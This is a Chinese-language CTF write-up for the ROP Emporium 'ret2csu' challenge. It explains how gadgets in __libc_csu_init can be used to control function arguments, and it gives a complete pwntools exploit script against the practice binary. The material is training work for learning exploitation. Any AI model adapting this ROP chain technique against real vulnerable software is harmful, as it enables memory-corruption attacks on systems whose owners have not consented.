---
title: "Write-ups: ROP Emporium series"
published: 2025-02-01
updated: 2025-02-01
description: "Write-ups for ROP Emporium series."
tags: ["Pwn", "Write-ups", "ROP"]
category: "Write-ups"
draft: false
---

# 前言

两月一号了，眼看九号就要打比赛我却还没学过 `ret2csu` 和 `SROP`，所以特此提前开一章 [ROP Emporium](https://ropemporium.com/) 的题解，问就是里面有一道 `ret2csu`，而且早晚会得这份题库的 LMAO

可惜没有 `SROP`，那这个我只能去 [Nightmare](https://guyinatuxedo.github.io/) 找题做了，要不就自己出一题也行。

啊，突然想起来还有 `ret2dlresolve` 和 `ret2vDSO`……一会儿再开一章 tricks 专题好了，就从 ROP 的 tricks 开始写。

# Challenge 8

## Information

- Category: Pwn

## Description

> We're back in ret2win territory, but this time with no useful gadgets.<br/>
> How will we populate critical registers without them?

## Write-up

~_好啊，ROP Emporium 一共就八道题，而 ret2csu 就是这最后一题，有种上来就 bypass 小怪直奔去 attack BOSS's ass 的感觉，帅不帅？(bushi)_~

嗯……有关 `ret2csu` 这个 trick 的详细信息，可以去读这篇发在 Black Hat Asia 的论文[^1].

简单来说就是当你找不到可以控制函数参数的 gadgets 时，就可以考虑一下这个 trick.

> 当一个程序使用某些库（如 libc）时，它有一些内置函数来管理程序不同部分之间的通信。在这些函数中，有一些隐藏的宝石可以作为我们缺失的 gadgets，特别是一个叫 `__libc_csu_init` 的函数。——Hack Tricks

就以本题的 `__libc_csu_init` 为例（不同版本的 libc 的这个函数可能略有区别，不过影响不大），看一下里面有什么好东东：

```asm wrap=false showLineNumbers=false ins={30-33, 40-46}
__libc_csu_init
__libc_csu_init          ; =============== S U B R O U T I N E =======================================
__libc_csu_init
__libc_csu_init
__libc_csu_init          ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)
__libc_csu_init                          public __libc_csu_init
__libc_csu_init          __libc_csu_init proc near               ; DATA XREF: _start+16↑o
__libc_csu_init          ; __unwind {
__libc_csu_init      000                 push    r15
__libc_csu_init+2    008                 push    r14
__libc_csu_init+4    010                 mov     r15, rdx
__libc_csu_init+7    010                 push    r13
__libc_csu_init+9    018                 push    r12
__libc_csu_init+B    020                 lea     r12, __frame_dummy_init_array_entry ; Load Effective Address
__libc_csu_init+12   020                 push    rbp
__libc_csu_init+13   028                 lea     rbp, __do_global_dtors_aux_fini_array_entry ; Load Effective Address
__libc_csu_init+1A   028                 push    rbx
__libc_csu_init+1B   030                 mov     r13d, edi
__libc_csu_init+1E   030                 mov     r14, rsi
__libc_csu_init+21   030                 sub     rbp, r12        ; Integer Subtraction
__libc_csu_init+24   030                 sub     rsp, 8          ; Integer Subtraction
__libc_csu_init+28   038                 sar     rbp, 3          ; Shift Arithmetic Right
__libc_csu_init+2C   038                 call    _init_proc      ; Call Procedure
__libc_csu_init+31   038                 test    rbp, rbp        ; Logical Compare
__libc_csu_init+34   038                 jz      short loc_400696 ; Jump if Zero (ZF=1)
__libc_csu_init+36   038                 xor     ebx, ebx        ; Logical Exclusive OR
__libc_csu_init+38   038                 nop     dword ptr [rax+rax+00000000h] ; No Operation
__libc_csu_init+40
__libc_csu_init+40       loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j
__libc_csu_init+40   038                 mov     rdx, r15
__libc_csu_init+43   038                 mov     rsi, r14
__libc_csu_init+46   038                 mov     edi, r13d
__libc_csu_init+49   038                 call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8] ; Indirect Call Near Procedure
__libc_csu_init+4D   038                 add     rbx, 1          ; Add
__libc_csu_init+51   038                 cmp     rbp, rbx        ; Compare Two Operands
__libc_csu_init+54   038                 jnz     short loc_400680 ; Jump if Not Zero (ZF=0)
__libc_csu_init+56
__libc_csu_init+56       loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j
__libc_csu_init+56   038                 add     rsp, 8          ; Add
__libc_csu_init+5A   030                 pop     rbx
__libc_csu_init+5B   028                 pop     rbp
__libc_csu_init+5C   020                 pop     r12
__libc_csu_init+5E   018                 pop     r13
__libc_csu_init+60   010                 pop     r14
__libc_csu_init+62   008                 pop     r15
__libc_csu_init+64   000                 retn                    ; Return Near from Procedure
__libc_csu_init+64       ; } // starts at 400640
__libc_csu_init+64       __libc_csu_init endp
__libc_csu_init+64
__libc_csu_init+64       ; ---------------------------------------------------------------------------
```

我们发现有两个实用的 gadgets，分别是：

```asm wrap=false showLineNumbers=false
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

```asm wrap=false showLineNumbers=false
mov rdx, r15
mov rsi, r14
mov edi, r13d
call QWORD PTR [r12 + rbx * 8]
```

这不就直接控制了函数的前三个参数了？多好。

注意第二个 gadget 也可以是以 `ret` 结束的，但是需要抵消一些 side effects：

```asm wrap=false showLineNumbers=false
mov rdx, r15
mov rsi, r14
mov edi, r13d
call QWORD PTR [r12 + rbx * 8]
add rbx, 0x1
cmp rbp, rbx
jnz <func>
  <snap>
ret
```

- `[r12 + rbx * 8]` 必须指向一个存储可调用函数的地址（如果没有想法且没有 PIE，可以直接使用 `_init` 函数）。
- `rbp` 和 `rbx` 必须具有相同的值以避免跳转。
- 有一些被省略的 `pop`s 需要考虑。

另外，从 ret2csu gadget 控制 rdi 和 rsi 的另一种方法是通过访问特定的偏移量，可以参考这篇讲 BROP 的论文[^2].

![](https://fastly.jsdelivr.net/gh/CuB3y0nd/picx-images-hosting@master/.4qrmd63stf.svg)

唯一一个问题可能就是怎么让 `call QWORD PTR [r12 + rbx * 8]` 调用 `_init` 了，不解释，直接看操作：

```asm wrap=false showLineNumbers=false ins={7-8}
pwndbg> x/a _init
0x4004d0 <_init>: 0x1d058b4808ec8348
pwndbg> search -t dword 0x4004d0
Searching for a 4-byte integer: b'\xd0\x04@\x00'
ret2csu         0x400398 rol byte ptr [rax + rax*2], 1
ret2csu         0x400e38 rol byte ptr [rax + rax*2], 1
ret2csu         0x600398 0x4004d0 (_init)
ret2csu         0x600e38 0x4004d0 (_init)
```

## Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import ELF, context, flat, gdb, log, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./ret2csu"
HOST, PORT = "localhost", 1337

gdbscript = """
b *pwnme+133
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload():
    padding_to_ret = b"".ljust(0x28, b"A")

    _init = 0x600398
    __libc_csu_init = elf.symbols["__libc_csu_init"]

    generic_gadget_1 = __libc_csu_init + 90
    generic_gadget_2 = __libc_csu_init + 64
    pop_rdi_ret = __libc_csu_init + 99

    cleanup_regs = [b"".ljust(0x8, b"A") * 6]

    return flat(
        padding_to_ret,
        generic_gadget_1,
        0x0,  # rbx
        0x1,  # rbp
        _init,  # r12 —▸ _init
        b"".ljust(0x8, b"A"),  # r13
        0xCAFEBABECAFEBABE,  # r14 —▸ rsi
        0xD00DF00DD00DF00D,  # r15 —▸ rdx
        generic_gadget_2,
        b"".ljust(0x8, b"A"),  # add rsp, 0x8
        *cleanup_regs,  # for generic_gadget_1
        pop_rdi_ret,
        0xDEADBEEFDEADBEEF,
        elf.symbols["ret2win"],
    )


def attack(target):
    try:
        payload = construct_payload()

        target.sendafter(b"> ", payload)

        response = target.recvall(timeout=3)

        if b"ROPE{" in response:
            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `ROPE{a_placeholder_32byte_flag!}`

# 后记

没有后记，这系列还有七题没打呢写个毛的后记……

[^1]: Marco-gisbert, Hector and Ismael Ripoll. "return-to-csu: a new method to bypass 64-bit Linux ASLR." (2018).
[^2]: A. Bittau, A. Belay, A. Mashtizadeh, D. Mazières and D. Boneh, "Hacking Blind," 2014 IEEE Symposium on Security and Privacy, Berkeley, CA, USA, 2014, pp. 227-242, doi: 10.1109/SP.2014.22.
